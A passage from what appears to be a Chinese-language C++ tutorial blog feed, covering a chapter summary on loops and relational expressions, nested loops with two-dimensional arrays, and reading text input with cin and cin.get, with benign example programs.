class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子根据分数范围判断对应的等级。程序会按顺序检查条件，一旦满足一个（例如 <code>score &gt;= 80</code>），就会确定等级为 ‘B’，并跳过后续的 <code>else if</code> 和 <code>else</code>。最后的 <code>else</code> 处理所有低于 60 分的情况。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5.7 总结</title>
      <link href="2025/04/26/5.7_%E6%80%BB%E7%BB%93/"/>
      <url>2025/04/26/5.7_%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>本章重点介绍了C++中的<strong>循环结构</strong>和<strong>关系表达式</strong>，它们是控制程序流程和处理重复任务的基础。</p><p>我们学习了三种主要的循环语句：</p><ol><li> <strong><code>for</code> 循环:</strong> 这是一种入口条件循环，其头部包含了初始化、测试条件和更新三个部分，结构清晰，特别适用于计数或已知迭代次数的情况。我们探讨了其组成部分、如何修改步长、使用它访问字符串（C风格和<code>std::string</code>），并详细学习了递增 (<code>++</code>) 和递减 (<code>--</code>) 运算符（包括前缀和后缀形式及其区别、副作用和顺序点问题、在指针上的应用）。此外，还介绍了组合赋值运算符（如 <code>+=</code>, <code>-=</code>）和逗号运算符在 <code>for</code> 循环中的应用。</li><li> <strong><code>while</code> 循环:</strong> 这也是一种入口条件循环，但结构更简单，只包含一个测试条件。它适用于循环次数不确定、依赖于某个条件持续满足的情况。我们比较了 <code>for</code> 和 <code>while</code> 的适用场景，并了解了如何使用循环（虽然不推荐）以及现代 C++ 的 <code>&lt;chrono&gt;</code> 和 <code>&lt;thread&gt;</code> 库来实现延时。</li><li> <strong><code>do while</code> 循环:</strong> 这是一种出口条件循环，其特点是循环体至少执行一次，然后在每次迭代结束时检查条件。它适用于需要确保操作至少发生一次的场景，如用户输入验证。</li></ol><p>C++11 引入的<strong>基于范围的 <code>for</code> 循环</strong>提供了一种更简洁、更安全的遍历序列（如数组、<code>vector</code>、<code>string</code>、初始化列表）中所有元素的方式。我们学习了其语法、如何使用 <code>auto</code>、引用 (<code>&amp;</code>) 和常量引用 (<code>const &amp;</code>) 来声明循环变量，以及它的优点和局限性（如无法直接获取索引）。</p><p><strong>关系表达式</strong>使用关系运算符（<code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>==</code>, <code>!=</code>）来比较值，结果为布尔值 <code>true</code> 或 <code>false</code>，常用于循环和分支语句的条件判断。我们特别强调了将赋值运算符 (<code>=</code>) 误用为比较运算符 (<code>==</code>) 的常见错误及其后果。对于字符串比较，我们了解到 C 风格字符串需要使用 <code>&lt;cstring&gt;</code> 中的 <code>strcmp()</code> 函数来比较内容，而 <code>std::string</code> 类则可以直接使用重载的关系运算符进行内容的字典序比较。</p><p>本章还深入探讨了<strong>循环与文本输入</strong>的结合。我们分析了 <code>cin &gt;&gt;</code> 读取单词（跳过并停止于空白）的行为，以及如何使用 <code>cin.get(char)</code> 和无参数的 <code>cin.get()</code> 来逐个读取字符（包括空白符）。我们学习了如何检测<strong>文件尾 (EOF)</strong> 条件以正确终止输入循环，包括检查 <code>cin</code> 流状态和 <code>cin.get()</code> 的返回值。最后，我们了解了读取 C 风格字符串的 <code>cin.get(buffer, size)</code> 版本及其与 <code>getline</code> 的区别（分隔符处理）。</p><p>最后，我们学习了<strong>嵌套循环</strong>的概念，即一个循环包含在另一个循环内部，以及如何使用嵌套循环来处理<strong>二维数组</strong>（数组的数组）。我们了解了二维数组的初始化方法和如何使用双重索引 <code>[row][col]</code> 配合嵌套循环来访问和处理其所有元素。</p><p>通过本章的学习，我们掌握了 C++ 中控制重复执行和进行比较的核心工具，为编写更复杂、更强大的程序奠定了基础。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5.6 嵌套循环和二维数组</title>
      <link href="2025/04/26/5.6_%E5%B5%8C%E5%A5%97%E5%BE%AA%E7%8E%AF%E5%92%8C%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/"/>
      <url>2025/04/26/5.6_%E5%B5%8C%E5%A5%97%E5%BE%AA%E7%8E%AF%E5%92%8C%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<p><strong>嵌套循环 (Nested Loop)</strong> 是指一个循环结构完全包含在另一个循环结构的循环体内部。外层循环每执行一次，内层循环会完整地执行一遍（从开始到结束）。嵌套循环常用于处理具有多维结构的数据，例如表格、矩阵或图像的像素。</p><p><strong>二维数组 (Two-Dimensional Array)</strong> 是数组的一种扩展，可以看作是“数组的数组”。它在概念上像一个表格或网格，有行 (row) 和列 (column)。二维数组是使用嵌套循环处理的典型数据结构。</p><p><strong>嵌套循环示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> ROWS = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> COLS = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Nested loop example (printing coordinates):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 外层循环控制行</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ROWS; ++i) &#123; </span><br><span class="line">        <span class="comment">// 内层循环控制列</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; COLS; ++j) &#123;</span><br><span class="line">            <span class="comment">// 对于外层循环的每次迭代 (i)，内层循环会完整执行一遍 (j 从 0 到 COLS-1)</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; j &lt;&lt; <span class="string">&quot;) &quot;</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 每行结束后换行</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Nested loop example (printing coordinates):</span><br><span class="line">(0,0) (0,1) (0,2) (0,3) </span><br><span class="line">(1,0) (1,1) (1,2) (1,3) </span><br><span class="line">(2,0) (2,1) (2,2) (2,3) </span><br></pre></td></tr></table></figure><h2 id="5-6-1-初始化二维数组"><a href="#5-6-1-初始化二维数组" class="headerlink" title="5.6.1 初始化二维数组"></a>5.6.1 初始化二维数组</h2><p>声明二维数组需要指定两个维度的大小：第一个是<strong>行数</strong>，第二个是<strong>列数</strong>。</p><p><strong>声明语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeName arrayName[numberOfRows][numberOfColumns];</span><br></pre></td></tr></table></figure><p><strong>初始化方法:</strong></p><p>可以使用嵌套的花括号 <code>&#123;&#125;</code> 来初始化二维数组。外层花括号代表整个数组，内层花括号代表每一行。</p><ol><li><strong>完整初始化:</strong> 提供所有行的初始化列表。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> matrix[<span class="number">3</span>][<span class="number">4</span>] = &#123; <span class="comment">// 3 行 4 列</span></span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;,    <span class="comment">// 初始化第 0 行</span></span><br><span class="line">    &#123;<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>&#125;,    <span class="comment">// 初始化第 1 行</span></span><br><span class="line">    &#123;<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;  <span class="comment">// 初始化第 2 行</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><strong>部分初始化:</strong> 如果提供的初始化值不足，剩余元素会被自动初始化为 0（对于数值类型）。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> partial[<span class="number">3</span>][<span class="number">4</span>] = &#123;</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">2</span>&#125;,          <span class="comment">// 第 0 行: &#123;1, 2, 0, 0&#125;</span></span><br><span class="line">    &#123;<span class="number">5</span>&#125;              <span class="comment">// 第 1 行: &#123;5, 0, 0, 0&#125;</span></span><br><span class="line">                     <span class="comment">// 第 2 行: &#123;0, 0, 0, 0&#125; (未提供初始化列表)</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将整个二维数组初始化为 0</span></span><br><span class="line"><span class="keyword">int</span> allZeros[<span class="number">10</span>][<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">// 或 C++11: int allZeros[10][20] &#123;&#125;;</span></span><br></pre></td></tr></table></figure></li><li><strong>省略行数 (但不能省略列数):</strong> 如果在声明时提供了初始化列表，可以省略第一个维度（行数），编译器会根据初始化列表推断行数。<strong>但第二个维度（列数）必须指定。</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> inferredRows[][<span class="number">4</span>] = &#123; <span class="comment">// 列数必须是 4</span></span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>&#125;</span><br><span class="line">&#125;; <span class="comment">// 编译器推断行数为 2</span></span><br></pre></td></tr></table></figure></li><li><strong>C++11 列表初始化:</strong> 可以省略等号 <code>=</code>。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> matrix_cpp11[<span class="number">2</span>][<span class="number">3</span>] &#123; &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;, &#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125; &#125;;</span><br><span class="line"><span class="keyword">int</span> zeros_cpp11[<span class="number">5</span>][<span class="number">5</span>] &#123;&#125;; <span class="comment">// 所有元素初始化为 0</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 完整初始化</span></span><br><span class="line">    <span class="keyword">int</span> data[<span class="number">2</span>][<span class="number">3</span>] = &#123;</span><br><span class="line">        &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;,</span><br><span class="line">        &#123;<span class="number">40</span>, <span class="number">50</span>, <span class="number">60</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 部分初始化</span></span><br><span class="line">    <span class="keyword">float</span> coords[<span class="number">3</span>][<span class="number">2</span>] = &#123;</span><br><span class="line">        &#123;<span class="number">1.1f</span>, <span class="number">2.2f</span>&#125;,</span><br><span class="line">        &#123;<span class="number">3.3f</span>&#125; <span class="comment">// &#123;3.3f, 0.0f&#125;</span></span><br><span class="line">        <span class="comment">// 第三行为 &#123;0.0f, 0.0f&#125;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 省略行数</span></span><br><span class="line">    <span class="keyword">char</span> messages[][<span class="number">10</span>] = &#123; <span class="comment">// 列数必须指定</span></span><br><span class="line">        <span class="string">&quot;Hello&quot;</span>,</span><br><span class="line">        <span class="string">&quot;World&quot;</span></span><br><span class="line">    &#125;; <span class="comment">// 推断为 2 行 10 列</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++11 初始化</span></span><br><span class="line">    <span class="keyword">int</span> table[<span class="number">2</span>][<span class="number">2</span>] &#123; &#123;<span class="number">1</span>&#125;, &#123;<span class="number">3</span>, <span class="number">4</span>&#125; &#125;; <span class="comment">// &#123;&#123;1, 0&#125;, &#123;3, 4&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;data[1][1]: &quot;</span> &lt;&lt; data[<span class="number">1</span>][<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 50</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;coords[1][1]: &quot;</span> &lt;&lt; coords[<span class="number">1</span>][<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;messages[0]: &quot;</span> &lt;&lt; messages[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Hello</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;table[0][1]: &quot;</span> &lt;&lt; table[<span class="number">0</span>][<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-6-2-使用二维数组"><a href="#5-6-2-使用二维数组" class="headerlink" title="5.6.2 使用二维数组"></a>5.6.2 使用二维数组</h2><p>访问二维数组的元素需要提供两个索引：第一个是<strong>行索引</strong>，第二个是<strong>列索引</strong>。索引同样从 0 开始。</p><p><strong>访问语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arrayName[rowIndex][columnIndex]</span><br></pre></td></tr></table></figure><p><strong>使用嵌套循环处理二维数组:</strong></p><p>嵌套循环是处理二维数组所有元素的标准方法。通常，外层循环遍历行，内层循环遍历列。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> NUM_CITIES = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> NUM_MONTHS = <span class="number">4</span>; <span class="comment">// 假设只记录 4 个月的数据</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 存储 3 个城市 4 个月的平均气温</span></span><br><span class="line">    <span class="keyword">double</span> temperatures[NUM_CITIES][NUM_MONTHS] = &#123;</span><br><span class="line">        &#123;<span class="number">10.5</span>, <span class="number">12.1</span>, <span class="number">15.3</span>, <span class="number">18.0</span>&#125;, <span class="comment">// City 0</span></span><br><span class="line">        &#123;<span class="number">8.2</span>, <span class="number">9.5</span>, <span class="number">13.0</span>, <span class="number">16.5</span>&#125;,  <span class="comment">// City 1</span></span><br><span class="line">        &#123;<span class="number">12.0</span>, <span class="number">14.5</span>, <span class="number">17.8</span>, <span class="number">21.2</span>&#125;  <span class="comment">// City 2</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Monthly average temperatures:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用嵌套循环遍历并打印所有温度</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> city = <span class="number">0</span>; city &lt; NUM_CITIES; ++city) &#123; <span class="comment">// 外层循环遍历城市 (行)</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;City &quot;</span> &lt;&lt; city &lt;&lt; <span class="string">&quot;: &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> month = <span class="number">0</span>; month &lt; NUM_MONTHS; ++month) &#123; <span class="comment">// 内层循环遍历月份 (列)</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; temperatures[city][month] &lt;&lt; <span class="string">&quot;\t&quot;</span>; <span class="comment">// 使用行和列索引访问元素</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算 City 1 的总温度和平均温度</span></span><br><span class="line">    <span class="keyword">double</span> city1_total = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">int</span> city_index = <span class="number">1</span>; <span class="comment">// 要计算的城市索引</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> month = <span class="number">0</span>; month &lt; NUM_MONTHS; ++month) &#123;</span><br><span class="line">        city1_total += temperatures[city_index][month];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">double</span> city1_average = city1_total / NUM_MONTHS;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nAverage temperature for City &quot;</span> &lt;&lt; city_index &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; city1_average &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算所有城市第一个月的平均温度</span></span><br><span class="line">    <span class="keyword">double</span> month0_total = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">int</span> month_index = <span class="number">0</span>; <span class="comment">// 要计算的月份索引</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> city = <span class="number">0</span>; city &lt; NUM_CITIES; ++city) &#123;</span><br><span class="line">        month0_total += temperatures[city][month_index];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">double</span> month0_average = month0_total / NUM_CITIES;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Average temperature for Month &quot;</span> &lt;&lt; month_index &lt;&lt; <span class="string">&quot; across all cities: &quot;</span> &lt;&lt; month0_average &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>内存布局:</strong><br>在内存中，二维数组通常是按<strong>行主序 (Row-Major Order)</strong> 存储的。这意味着第一行的所有元素连续存储，然后是第二行的所有元素，依此类推。例如，<code>matrix[3][4]</code> 的内存布局看起来像：<br><code>matrix[0][0], matrix[0][1], matrix[0][2], matrix[0][3], matrix[1][0], matrix[1][1], ... , matrix[2][3]</code></p><p>理解这一点对于将二维数组传递给函数（通常需要知道列数）或进行某些指针操作很重要。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5.5 循环和文本输入</title>
      <link href="2025/04/26/5.5_%E5%BE%AA%E7%8E%AF%E5%92%8C%E6%96%87%E6%9C%AC%E8%BE%93%E5%85%A5/"/>
      <url>2025/04/26/5.5_%E5%BE%AA%E7%8E%AF%E5%92%8C%E6%96%87%E6%9C%AC%E8%BE%93%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>循环结构在处理文本输入时非常有用，特别是当我们需要逐个字符或逐行读取数据，直到满足某个条件（如遇到特定字符、文件结束或达到一定数量）时。本节将探讨使用 <code>cin</code> 及其相关方法进行文本输入的常见模式和技巧。</p><h2 id="5-5-1-使用原始的cin进行输入"><a href="#5-5-1-使用原始的cin进行输入" class="headerlink" title="5.5.1 使用原始的cin进行输入"></a>5.5.1 使用原始的cin进行输入</h2><p>我们已经知道，使用 <code>cin &gt;&gt; variable</code> 可以从标准输入读取数据。当用于读取文本（如 <code>char</code> 或 <code>string</code>）时，<code>cin &gt;&gt;</code> 的行为特点是：</p><ol><li> <strong>跳过空白:</strong> 它会自动忽略输入流中开头的任何空白字符（空格、制表符、换行符）。</li><li> <strong>读取直到空白:</strong> 它会读取非空白字符，直到遇到下一个空白字符为止。</li><li> <strong>空白符留在流中:</strong> 停止读取时遇到的那个空白字符会<strong>留在</strong>输入流（输入缓冲区）中，等待下一次读取操作。</li></ol><p>这使得 <code>cin &gt;&gt;</code> 适合读取单个单词或以空白分隔的数据项，但不适合读取包含空格的整行文本或精确地逐个字符处理（包括空格）。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> word;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter some characters (e.g., &#x27;a b c&#x27;): &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取第一个非空白字符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; ch; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First char read: &#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 如果输入 &quot;  a b c&quot;, 这里会读到 &#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取下一个单词</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; word;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Next word read: \&quot;&quot;</span> &lt;&lt; word &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 会读到 &quot;b&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 再次读取字符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; ch;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Next char read: &#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 会读到 &#x27;c&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环读取单词直到输入结束 (例如按 Ctrl+Z/Ctrl+D)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnter words (Ctrl+Z/D to stop):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; word) &#123; <span class="comment">// cin &gt;&gt; word 在成功读取时返回 true</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Read word: &quot;</span> &lt;&lt; word &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 注意：循环结束后，cin 可能处于失败状态</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>while (std::cin &gt;&gt; word)</code> 是一种常见的读取模式，它利用了 <code>cin</code> 对象在成功读取时可以被转换为 <code>true</code> 的特性。当读取失败（例如到达文件末尾或遇到无效输入）时，<code>cin</code> 对象会转换为 <code>false</code>，循环终止。</p><h2 id="5-5-2-使用cin-get-char-进行补救"><a href="#5-5-2-使用cin-get-char-进行补救" class="headerlink" title="5.5.2 使用cin.get(char)进行补救"></a>5.5.2 使用cin.get(char)进行补救</h2><p><code>cin &gt;&gt;</code> 跳过空白并停止于空白的行为有时不是我们想要的，特别是当我们需要读取包括空格在内的每一个字符时。<code>cin.get(char&amp; ch)</code> 成员函数提供了解决方案。</p><ul><li><code>cin.get(char&amp; ch)</code>:<ul><li>  尝试从输入流中读取<strong>下一个</strong>字符（无论它是什么，包括空格、制表符、换行符）。</li><li>  如果成功读取，将该字符存储在参数 <code>ch</code> 中，并返回 <code>cin</code> 对象本身（可以转换为 <code>true</code>）。</li><li>  如果到达文件末尾或发生错误，不修改 <code>ch</code>，并将 <code>cin</code> 置于失败状态（转换为 <code>false</code>）。</li></ul></li></ul><p>这使得 <code>cin.get(char)</code> 